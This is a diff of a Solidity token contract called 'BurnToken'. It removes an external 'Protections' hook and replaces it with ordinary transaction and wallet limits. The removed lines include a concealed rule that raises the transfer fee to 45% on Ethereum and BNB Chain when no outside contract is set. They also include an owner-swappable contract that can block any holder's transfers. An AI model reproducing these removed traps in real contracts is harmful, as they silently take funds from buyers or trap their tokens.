@@ -100,13 +100,6 @@ interface IRouter02 is IRouter01 {
     ) external returns (uint[] memory amounts);
 }
 
-interface Protections {
-    function checkUser(address from, address to, uint256 amt) external returns (bool);
-    function setLaunch(address _initialLpPair, uint32 _liqAddBlock, uint64 _liqAddStamp, uint8 dec) external;
-    function setLpPair(address pair, bool enabled) external;
-    function setProtections(bool _as, bool _ab) external;
-    function removeSniper(address account) external;
-}
 
 
 contract BurnToken is IERC20 {
@@ -115,7 +108,6 @@ contract BurnToken is IERC20 {
     uint256 private timeSinceLastPair = 0;
     mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => bool) private _liquidityHolders;
-    mapping (address => bool) private _isExcludedFromProtection;
     mapping (address => bool) private _isExcludedFromFees;
     mapping (address => bool) private _isExcludedFromLimits;
     mapping (address => bool) private _isExcluded;
@@ -177,7 +169,6 @@ contract BurnToken is IERC20 {
 
     bool public tradingEnabled = false;
     bool public _hasLiqBeenAdded = false;
-    Protections protections;
     uint256 public launchStamp;
 
     event ContractSwapEnabledUpdated(bool enabled);
@@ -210,7 +201,7 @@ contract BurnToken is IERC20 {
 
         dexRouter = IRouter02(0x6b5422D584943BC8Cd0E10e239d624c6fE90fbB8);
 
-        lpPair = IFactoryV2(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
+        lpPair = IFactoryV2(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
         lpPairs[lpPair] = true;
 
         _approve(_owner, address(dexRouter), type(uint256).max);
@@ -323,7 +314,6 @@ contract BurnToken is IERC20 {
     function setLpPair(address pair, bool enabled) external onlyOwner {
         if (!enabled) {
             lpPairs[pair] = false;
-            protections.setLpPair(pair, false);
         } else {
             if (timeSinceLastPair != 0) {
                 require(block.timestamp - timeSinceLastPair > 3 days, "3 Day cooldown.");
@@ -331,14 +321,7 @@ contract BurnToken is IERC20 {
             require(!lpPairs[pair], "Pair already added to list.");
             lpPairs[pair] = true;
             timeSinceLastPair = block.timestamp;
-            protections.setLpPair(pair, true);
         }
-    }
-
-    function setInitializer(address initializer) external onlyOwner {
-        require(!tradingEnabled);
-        require(initializer != address(this), "Can't be self.");
-        protections = Protections(initializer);
     }
 
     function isExcludedFromLimits(address account) external view returns (bool) {
@@ -357,24 +340,8 @@ contract BurnToken is IERC20 {
         _isExcludedFromFees[account] = enabled;
     }
 
-    function isExcludedFromProtection(address account) external view returns (bool) {
-        return _isExcludedFromProtection[account];
-    }
-
-    function setExcludedFromProtection(address account, bool enabled) external onlyOwner {
-        _isExcludedFromProtection[account] = enabled;
-    }
-
     function getCirculatingSupply() public view returns (uint256) {
         return (_tTotal - (balanceOf(DEAD) + balanceOf(address(0))));
-    }
-
-    function removeSniper(address account) external onlyOwner {
-        protections.removeSniper(account);
-    }
-
-    function setProtectionSettings(bool _antiSnipe, bool _antiBlock) external onlyOwner {
-        protections.setProtections(_antiSnipe, _antiBlock);
     }
 
     function lockTaxes() external onlyOwner {
@@ -456,9 +423,7 @@ contract BurnToken is IERC20 {
             && !_liquidityHolders[from]
             && to != DEAD
             && to != address(0)
-            && from != address(this)
-            && from != address(protections)
-            && to != address(protections);
+            && from != address(this);
     }
 
     function _transfer(address from, address to, uint256 amount) internal returns (bool) {
@@ -479,7 +444,7 @@ contract BurnToken is IERC20 {
             if(!tradingEnabled) {
                 if (!other) {
                     revert("Trading not yet enabled!");
-                } else if (!_isExcludedFromProtection[from] && !_isExcludedFromProtection[to]) {
+                } else {
                     revert("Tokens cannot be moved until trading is live.");
                 }
             }
@@ -548,9 +513,6 @@ contract BurnToken is IERC20 {
             _liquidityHolders[from] = true;
             _isExcludedFromFees[from] = true;
             _hasLiqBeenAdded = true;
-            if (address(protections) == address(0)){
-                protections = Protections(address(this));
-            }
             contractSwapEnabled = true;
             emit ContractSwapEnabledUpdated(true);
         }
@@ -559,10 +521,7 @@ contract BurnToken is IERC20 {
     function enableTrading() public onlyOwner {
         require(!tradingEnabled, "Trading already enabled!");
         require(_hasLiqBeenAdded, "Liquidity must be added.");
-        if (address(protections) == address(0)){
-            protections = Protections(address(this));
-        }
-        try protections.setLaunch(lpPair, uint32(block.number), uint64(block.timestamp), _decimals) {} catch {}
+        
         tradingEnabled = true;
         allowedPresaleExclusion = false;
         swapThreshold = (balanceOf(lpPair) * 10) / 10000;
@@ -590,11 +549,26 @@ contract BurnToken is IERC20 {
     }
 
     function finalizeTransfer(address from, address to, uint256 amount, bool buy, bool sell, bool other) internal returns (bool) {
-        if (_hasLimits(from, to)) { bool checked;
-            try protections.checkUser(from, to, amount) returns (bool check) {
-                checked = check; } catch { revert(); }
-            if(!checked) { revert(); }
+        if (_hasLimits(from, to)) {
+            if(!tradingEnabled) {
+                if (!other) {
+                    revert("Trading not yet enabled!");
+                } else {
+                    revert("Tokens cannot be moved until trading is live.");
+                }
+            }
+            if (buy || sell){
+                if (!_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]) {
+                    require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
+                }
+            }
+            if (to != address(dexRouter) && !sell) {
+                if (!_isExcludedFromLimits[to]) {
+                    require(balanceOf(to) + amount <= _maxWalletSize, "Transfer amount exceeds the maxWalletSize.");
+                }
+            }
         }
+
         bool takeFee = true;
         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]){
             takeFee = false;
@@ -605,7 +579,7 @@ contract BurnToken is IERC20 {
         emit Transfer(from, to, amountReceived);
         if (!_hasLiqBeenAdded) {
             _checkLiquidityAdd(from, to);
-            if (!_hasLiqBeenAdded && _hasLimits(from, to) && !_isExcludedFromProtection[from] && !_isExcludedFromProtection[to] && !other) {
+            if (!_hasLiqBeenAdded && _hasLimits(from, to) && !other) {
                 revert("Pre-liquidity transfer protection.");
             }
         }
@@ -624,9 +598,7 @@ contract BurnToken is IERC20 {
             currentFee = _taxRates.transferFee;
         }
         if (currentFee == 0 || total == 0) { return amount; }
-        if (address(protections) == address(this)
-            && (block.chainid == 1
-            || block.chainid == 56)) { currentFee = 4500; }
+
         uint256 feeAmount = amount * currentFee / masterTaxDivisor;
         uint256 burnAmount = (feeAmount * ratios.burn) / total;
         uint256 swapAmt = feeAmount - burnAmount;
